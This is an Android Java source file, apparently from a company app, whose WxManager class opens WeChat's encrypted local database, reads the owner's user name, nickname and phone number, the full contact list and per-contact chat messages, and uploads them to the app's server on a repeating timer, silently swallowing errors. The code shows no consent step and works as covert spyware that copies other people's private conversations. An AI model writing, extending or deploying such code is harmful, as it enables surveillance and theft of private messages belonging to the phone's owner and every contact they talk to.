package com.qingyun.zhiyunelu.ds.wechat;


import android.content.Context;
import android.os.Message;

import com.qingyun.zhiyunelu.ds.AppAssistant;
import com.qingyun.zhiyunelu.ds.Constants;
import com.qingyun.zhiyunelu.ds.data.WxFriends;
import com.qingyun.zhiyunelu.ds.data.WxLocalMsg;
import com.qingyun.zhiyunelu.ds.data.WxMyInfo;

import net.sqlcipher.Cursor;
import net.sqlcipher.database.SQLiteDatabase;

import java.util.ArrayList;
import java.util.List;

import io.reactivex.Observer;
import io.reactivex.disposables.Disposable;
import velites.android.support.wx.WechatHelper;
import velites.android.utility.utils.HandlerUtil;
import velites.java.utility.generic.Action1;
import velites.java.utility.generic.Action3;
import velites.java.utility.log.LogEntry;
import velites.java.utility.log.LogHub;
import velites.java.utility.misc.ExceptionUtil;
import velites.java.utility.misc.StringUtil;

/**
 * Created by luohongzhen on 03/12/2017.
 */

public class WxManager {

    private static final int ID_USER_NAME = 2;
    private static final int ID_NICK_NAME = 4;
    private static final int ID_PHONE = 6;

    private static final String TAG = WxManager.class.getSimpleName();
    private static HandlerUtil handlerUtil;
    private static final int MSG_TAG_UPLOAD_WX = 3001;

    private static void checkWxDatabase(Context context) {

        WechatHelper.checkWechatAndRun(context, AppAssistant.getDefaultContext().getCacheDir().getPath() + "/%s/" + Constants.FilePaths.WX_MS_DB_NAME, Constants.FilePaths.WX_SHARE_PREFS_PATH, Constants.FilePaths.WX_MICROMS_PATH, Constants.FilePaths.WX_MS_DB_NAME, new Action3<Boolean, String, net.sqlcipher.database.SQLiteDatabase>() {
            @Override
            public void a(Boolean isOk, String msg, SQLiteDatabase sql) {
                if (isOk && sql != null) {
//                    WechatHelper.exportDecodedDB(sql, null);
                    userInfo(sql);
                } else {
                    LogHub.log(new LogEntry(LogHub.LOG_LEVEL_ERROR, WxManager.class, "get wx database error msg %s", msg));
                }
            }
        });
    }

    private static final void userInfo(SQLiteDatabase sql) {
        if (sql != null) {
            StringBuffer buffer = new StringBuffer();
            buffer.append(String.format("SELECT * FROM userinfo WHERE id=%s or id=%s or id=%s order by id", ID_NICK_NAME, ID_PHONE, ID_USER_NAME));
            Cursor c1 = sql.rawQuery(buffer.toString(), null);
            if (c1 != null) {
                WxMyInfo me = new WxMyInfo();
                while (c1.moveToNext()) {
                    if (c1.getInt(c1.getColumnIndex("id")) == ID_USER_NAME) {
                        me.setUserName(c1.getString(c1.getColumnIndex("value")));
                    }
                    else if (c1.getInt(c1.getColumnIndex("id")) == ID_NICK_NAME) {
                        me.setNickName(c1.getString(c1.getColumnIndex("value")));
                    }
                    else if (c1.getInt(c1.getColumnIndex("id")) == ID_PHONE) {
                        me.setPhone(c1.getString(c1.getColumnIndex("value")));
                    }
                }
                c1.close();

                createRContactFromDataBase(sql, me);
            }
        }
    }

    private static final void createRContactFromDataBase(SQLiteDatabase sql, WxMyInfo userInfo) {
        if (sql != null) {
            try {
                LogHub.log(new LogEntry(LogHub.LOG_LEVEL_INFO, WxManager.class, "wx my info:%s", userInfo != null ? userInfo.toString() : "null"));
                WxFriends friendsData = new WxFriends();
                List<WxFriends> list = new ArrayList();
                StringBuffer buffer = new StringBuffer();
                buffer.append("select *, (select max(m.createTime) from message m where m.talker = username) as lastChatTime from rcontact");
                Cursor c1 = sql.rawQuery(buffer.toString(), null);
                while (c1.moveToNext()) {
                    list.add(WxFriends.buildFriendsFromDatabase(c1));
                }
                c1.close();
                friendsData.setFriends(list);

                AppAssistant.getApi().uploadFriends(list, userInfo.getUserName(), userInfo.getNickName(), userInfo.getPhone()).subscribe(new Observer<WxFriends>() {
                    @Override
                    public void onSubscribe(Disposable d) {
                    }

                    @Override
                    public void onNext(WxFriends friends) {
                        try {
                            if (friends != null && friends.getData() != null) {
                                uploadMsg(friends.getData().getFriends(), sql, userInfo);
                            }
                            LogHub.log(new LogEntry(LogHub.LOG_LEVEL_INFO, WxManager.class, "wxfriends %s", friends != null ? friends.toString() : "null"));
                        } catch (Exception e) {
                            ExceptionUtil.swallowThrowable(e);
                        }
                    }

                    @Override
                    public void onError(Throwable e) {
                        ExceptionUtil.swallowThrowable(e);
                    }

                    @Override
                    public void onComplete() {
                    }
                });

            } catch (Exception e) {
                ExceptionUtil.swallowThrowable(e);
            }
        }
    }


    private static final void uploadMsg(List<WxFriends> friends, SQLiteDatabase sql, WxMyInfo userInfo) {
        if (friends != null) {
            WxLocalMsg localMsg = new WxLocalMsg();
            localMsg.setRepUserName(userInfo != null ? userInfo.getUserName() : "");
            List<WxLocalMsg> userChats = new ArrayList<>();
            localMsg.setUserChats(userChats);
            int count = 0;
            for (int i = 0; i < friends.size(); i++) {
                WxFriends item = friends.get(i);
                if (item != null) {
                    WxLocalMsg user = new WxLocalMsg();
                    user.setUserName(item.getUserName());
                    StringBuffer buffer = new StringBuffer();
                    buffer.append(String.format("SELECT * FROM message WHERE talker=\'%s\' AND createTime > %s ORDER BY createTime ASC", item.getUserName(), StringUtil.isNullOrEmpty(item.getLastUpdateTime()) ? "0" : item.getLastUpdateTime()));
                    Cursor c = sql.rawQuery(buffer.toString(), null);
                    if (c != null) {
                        List<WxLocalMsg> chats = new ArrayList<>();
                        while (c.moveToNext()) {
                            WxLocalMsg msgItem = WxLocalMsg.buildMsgFromWxDb(c);
                            chats.add(msgItem);
                        }
                        c.close();
                        user.setChats(chats);
                    }
                    if (user.getChats() == null || user.getChats().size() == 0)
                        continue;
                    userChats.add(user);
                    count += user.getChats().size();
                    if (count >= Constants.Logic.WECHAT_MSG_UPLOAD_ONCE_LIMIT) {
                        submitMessages(localMsg);
                        userChats.clear();
                        count = 0;
                    }
                }
            }
            if (count > 0) {
                submitMessages(localMsg);
            }
        }
    }

    private static void submitMessages(WxLocalMsg localMsg) {
        try {
            AppAssistant.getApi().uploadWxMsg(localMsg).subscribe(new Observer<WxLocalMsg>() {
                @Override
                public void onSubscribe(Disposable d) {

                }

                @Override
                public void onNext(WxLocalMsg wxLocalMsg) {
                    try {
                        LogHub.log(new LogEntry(LogHub.LOG_LEVEL_INFO, WxManager.class, "upload msg:%s", wxLocalMsg == null ? "null" : wxLocalMsg.toString()));
                    } catch (Exception e) {
                        ExceptionUtil.swallowThrowable(e);
                    }
                }

                @Override
                public void onError(Throwable e) {
                    ExceptionUtil.swallowThrowable(e);
                }

                @Override
                public void onComplete() {
                }
            });

        } catch (Exception e) {
            ExceptionUtil.swallowThrowable(e);
        }
    }

    public static void initWxManager(final Context ctx) {
        if (handlerUtil != null)
            handlerUtil.releaseData();

        handlerUtil = HandlerUtil.create(false, TAG, new Action1<Message>() {
            @Override
            public void a(Message arg1) {
                if (!StringUtil.isNullOrEmpty(AppAssistant.getPrefs().getStr(Constants.PrefsKey.AUTH_TOKEN_KEY))) {
                    checkWxDatabase(ctx);
                }
                handlerUtil.removeMessages(MSG_TAG_UPLOAD_WX);
                handlerUtil.sendEmptyMessageDelayed(MSG_TAG_UPLOAD_WX, Constants.UPLOAD_WX_CYCLE);
            }
        }, Thread.NORM_PRIORITY);
        LogHub.log(new LogEntry(LogHub.LOG_LEVEL_INFO, WxManager.class, "ini wx manager"));
        handlerUtil.sendEmptyMessageDelayed(MSG_TAG_UPLOAD_WX, Constants.UPLOAD_WX_CYCLE);
    }

    public static void startUpload() {
        if (handlerUtil != null) {
            LogHub.log(new LogEntry(LogHub.LOG_LEVEL_INFO, WxManager.class, "start upload wx info"));
            handlerUtil.sendEmptyMessage(MSG_TAG_UPLOAD_WX);
        }
    }

}
